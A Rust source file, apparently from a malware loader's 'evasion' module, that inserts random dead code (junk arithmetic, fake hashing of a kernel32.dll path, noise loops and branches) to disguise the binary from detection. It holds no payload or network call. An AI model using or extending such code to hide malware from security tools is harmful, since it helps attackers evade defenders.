// loader/src/evasion/dead_code.rs

use rand::Rng;
    
    /// Ajoute du code mort aléatoire
    pub fn generate_dead_code() {
        let mut rng = rand::rng();
        let dead_type = rng.random_range(0..4);
        
        match dead_type {
            0 => dead_calculations(),
            1 => fake_string_operations(),
            2 => loop_noise(),
            3 => branch_noise(),
            _ => {}
        }
    }
    
    fn dead_calculations() {
        let mut x: u64 = 0xDEADBEEF;
        for i in 0..1000 {
            x = x.wrapping_mul(i);
            x ^= 0xCAFEBABE;
            x = x.rotate_left(13);
        }
        // Résultat jamais utilisé
        let _ = x;
    }
    
    fn fake_string_operations() {
        let fake_path = "C:\\Windows\\System32\\kernel32.dll";
        let _ = fake_path.len();
        
        // Opérations qui semblent légitimes
        let mut buffer = [0u8; 256];
        for (i, byte) in fake_path.bytes().enumerate() {
            buffer[i % 256] = byte;
        }
        
        // Fake hash
        let mut fake_hash: u32 = 0x811C9DC5;
        for &byte in &buffer {
            fake_hash ^= byte as u32;
            fake_hash = fake_hash.wrapping_mul(0x01000193);
        }
    }
    
    fn loop_noise() {
        // Boucles qui ne servent à rien
        for _ in 0..50 {
            let mut x = 0u64;
            for j in 0..100 {
                x = x.wrapping_add(j as u64);
            }
        }
    }
    
    fn branch_noise() {
        // Branches aléatoires jamais prises
        let r: u32 = rand::random();
        if r < 100 {
            // Ce bloc ne sera jamais exécuté (statistiquement)
            panic!("Should never happen");
        } else if r > u32::MAX - 100 {
            // Celui non plus
            unimplemented!();
        } else {
            // Toujours ici
        }
    }